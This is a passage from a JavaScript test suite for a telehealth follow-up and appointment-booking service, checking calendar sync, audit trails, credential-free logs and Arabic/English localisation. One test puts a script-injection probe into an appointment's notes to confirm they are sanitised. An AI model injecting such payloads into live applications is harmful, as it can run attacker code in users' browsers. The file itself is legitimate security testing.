      slotId: 'slot_20261021_0930_cairo',
      notes: 'Priority clinical follow-up for acute bronchospasm <script>alert(1)</script>'
    },
    {
      db,
      user: verifiedAssignedDoctor,
      doctorProfile: verifiedAssignedDoctor,
      metadata: { ip: '156.204.18.10', userAgent: 'HealthVibe-Clinic/2.4' }
    }
  );

  assert.strictEqual(syncRes.success, true);
  assert.ok(syncRes.appointmentId, 'Appointment ID must be returned');
  assert.strictEqual(syncRes.appointment.status, 'confirmed');
  assert.strictEqual(syncRes.appointment.source, 'DOCTOLIB_FOLLOWUP_SYNC');
  assert.strictEqual(syncRes.appointment.type, 'clinic');
  assert(!syncRes.appointment.notes.includes('<script>'), 'Notes must be sanitized in calendar booking');
  assert.strictEqual(syncRes.followUpPlan.status, 'CALENDAR_LINKED');
  assert.strictEqual(syncRes.followUpPlan.appointmentId, syncRes.appointmentId);

  // Verify appointments collection in DB
  const appts = db.getAppointments();
  const linkedAppt = appts.find(a => a.id === syncRes.appointmentId);
  assert.ok(linkedAppt, 'Appointment document must exist in database');
  assert.strictEqual(linkedAppt.patientName, 'Ahmed Mahmoud');
  assert.strictEqual(linkedAppt.clinicId, 'clinic_cairo_central');
  markPassed(
    'Doctolib 5A: 1-Click Calendar Slot Synchronization',
    `Appointment ${syncRes.appointmentId} confirmed and linked to Case ${caseId1}`
  );

  // Test 5B: Preventing Calendar Sync without Established Follow-up Plan
  const caseIdNoPlan = 'case_no_plan_010';
  await db.collection('cases').doc(caseIdNoPlan).set({
    id: caseIdNoPlan,
    status: 'under_review',
    patientId: 'pat_unplanned_000',
    clinicId: 'clinic_cairo_central',
    assignedDoctorId: verifiedAssignedDoctor.uid
  });

  await assert.rejects(
    async () => {
      await doctorFollowUpService.syncFollowUpWithCalendar(
        caseIdNoPlan,
        {},
        {
          db,
          user: verifiedAssignedDoctor,
          doctorProfile: verifiedAssignedDoctor
        }
      );
    },
    (err) => {
      assert.strictEqual(err.statusCode, 400);
      assert.strictEqual(err.code, 'FOLLOW_UP_PLAN_MISSING');
      return true;
    }
  );
  markPassed(
    'Doctolib 5B: Guard Against Syncing Unplanned Cases',
    '400 FOLLOW_UP_PLAN_MISSING strictly enforced\n'
  );

  // ===========================================================================
  // SECTION 6: COMPREHENSIVE SECURITY AUDIT TRAIL & CONCURRENCY
  // ===========================================================================
  console.log('▶ SECTION 6: Audit Trail Veracity, PHI Protection & Concurrency\n');

  const auditLogs = db.getAuditLogs();
  assert(auditLogs.length >= 2, 'Audit logs must capture recommendation and calendar sync events');

  // Verify DOCTOR_FOLLOWUP_RECOMMENDED audit event
  const recommendLog = auditLogs.find(l => l.eventType === 'DOCTOR_FOLLOWUP_RECOMMENDED' && l.caseId === caseId1);
  assert.ok(recommendLog, 'Recommendation audit event must exist');
  assert.strictEqual(recommendLog.performedBy.uid, verifiedAssignedDoctor.uid);
  assert.strictEqual(recommendLog.performedBy.license, verifiedAssignedDoctor.doctorLicense);
  assert.strictEqual(recommendLog.details.window, 'within_24h');
  assert.strictEqual(recommendLog.ipAddress, '156.204.18.10');
  markPassed(
    'Audit 6A: DOCTOR_FOLLOWUP_RECOMMENDED Audit Trail Veracity',
    'Captures actor UID, syndicate license, IP, window, and urgency'
  );

  // Verify DOCTOR_FOLLOWUP_CALENDAR_LINKED audit event
  const syncLog = auditLogs.find(l => l.eventType === 'DOCTOR_FOLLOWUP_CALENDAR_LINKED' && l.caseId === caseId1);
  assert.ok(syncLog, 'Calendar sync audit event must exist');
  assert.strictEqual(syncLog.appointmentId, syncRes.appointmentId);
  assert.strictEqual(syncLog.performedBy.uid, verifiedAssignedDoctor.uid);
  markPassed(
    'Audit 6B: DOCTOR_FOLLOWUP_CALENDAR_LINKED Audit Trail Veracity',
    'Appointment link event registered with immutable timestamp and IP tracking'
  );

  // Verify PHI data minimization (No credentials leaked)
  auditLogs.forEach(log => {
    const serialized = JSON.stringify(log);
    assert(!serialized.includes('password'), 'Passwords must never appear in audit trail');
    assert(!serialized.includes('secretToken'), 'Tokens must never appear in audit trail');
  });
  markPassed(
    'Audit 6C: PHI Data Minimization & Secret Exposure Protection',
    'Zero sensitive credentials or raw auth secrets exposed in audit logs'
  );

  // Verify Clinical Revision & Status History Trajectory
  const caseAfterSync = db.getCase(caseId1);
  assert(caseAfterSync.clinicalRevision >= 2, 'Clinical revision must increment monotonically');
  assert(Array.isArray(caseAfterSync.statusHistory), 'statusHistory must be an array');
  const histEntry = caseAfterSync.statusHistory.find(h => h.action === 'RECOMMEND_FOLLOW_UP_WINDOW');
  assert.ok(histEntry, 'statusHistory must log recommendation entry');
  assert.strictEqual(histEntry.changedByName, verifiedAssignedDoctor.displayName);
  assert.strictEqual(histEntry.changedByLicense, verifiedAssignedDoctor.doctorLicense);
  markPassed(
    'Audit 6D: Clinical Revision Monotonic Bump & statusHistory Trajectory',
    `clinicalRevision bumped to ${caseAfterSync.clinicalRevision} with physician attribution\n`
  );

  // ===========================================================================
  // SECTION 7: FRONTEND UI HELPERS, 1-CLICK NAVIGATION & BILINGUAL LOCALISATION
  // ===========================================================================
  console.log('▶ SECTION 7: Frontend UI Helpers, Doctolib 1-Click Sync & Bilingual Parity\n');

  // Test 7A: UI Preset Catalog Parity with Backend
  assert.ok(Array.isArray(DoctorUI.FOLLOW_UP_WINDOWS), 'DoctorUI.FOLLOW_UP_WINDOWS must be an array');
  const backendKeys = Object.keys(doctorFollowUpService.FOLLOW_UP_WINDOWS);
  backendKeys.forEach(key => {
    const foundInUi = DoctorUI.FOLLOW_UP_WINDOWS.find(w => w.id === key);
    assert.ok(foundInUi, `UI catalog must contain preset '${key}'`);
    assert.ok(foundInUi.labelAr, `UI catalog '${key}' must have Arabic label`);
    assert.ok(foundInUi.labelEn, `UI catalog '${key}' must have English label`);
  });
  markPassed(
    'UI 7A: UI Preset Catalog Parity with Backend',
    '100% catalog parity between DoctorUI and doctorFollowUpService'
  );

  // Test 7B: 1-Click Calendar Booking Navigation Helper
  DoctorUI.clearDraftNotes(caseId1);
  DoctorUI.selectFollowUpWindow(caseId1, 'within_3d');
  DoctorUI.setFollowUpMode(caseId1, 'video');
  DoctorUI.setFollowUpInstructions(caseId1, 'Evaluate antibiotic response.');

  // Mock appointments notes input in DOM
  const mockNotesInput = createMockElement('apptNotesInput', 'textarea');

  global._lastScreen = null;
  global._lastApptDate = null;
  global._lastApptType = null;

  DoctorUI.linkToAppointmentBooking(caseId1);
  assert.strictEqual(global._lastScreen, 'appointments', 'Screen must transition to appointments');
  const plan = DoctorUI.getCaseFollowUpPlan(caseId1);
  assert.strictEqual(global._lastApptDate, plan.targetDate, 'Appointment date must be pre-selected');
  assert.strictEqual(global._lastApptType, 'video', 'Appointment type must match consultation mode');
  assert.ok(mockNotesInput.value.includes('Evaluate antibiotic response.'), 'Mock notes input must include clinical instructions');
  markPassed(
    'UI 7B: Doctolib 1-Click Booking Transition Helper',
    'Sets active date, matches consultation mode, pre-fills clinical directives'
  );

  // Test 7C: Bilingual Localization Parity
  const arDoctor = i18n.translations?.ar?.doctor || {};
  const enDoctor = i18n.translations?.en?.doctor || {};
  const requiredFollowUpKeys = [
    'followUpSectionTitle',
    'followUpSectionSubtitle',
    'followUpWindowLabel',
    'followUpWithin24h',
    'followUpWithin3d',
    'followUpWithin1w',
    'followUpWithin1m',
    'followUpCustom',
    'followUpAsNeeded',
    'followUpModeClinic',
    'followUpModeVideo',
    'followUpModePhone',
    'followUpInstructionsLabel',
    'followUpLinkCalendarBtn',
    'followUpReportBadge'
  ];

  requiredFollowUpKeys.forEach(k => {
    assert.ok(arDoctor[k], `Arabic translation must include key '${k}'`);
    assert.ok(enDoctor[k], `English translation must include key '${k}'`);
  });
  markPassed(
    'UI 7C: Bilingual Translation Dictionary Parity',
    '100% Arabic and English localization key parity across all follow-up terms\n'
  );

  // ===========================================================================
  // SUMMARY
  // ===========================================================================
  console.log('='.repeat(80));
  console.log(`RESULTS: ALL ${passedCount}/${testsCount} TESTS PASSED (100% SUCCESS)`);
  console.log('='.repeat(80));
})();
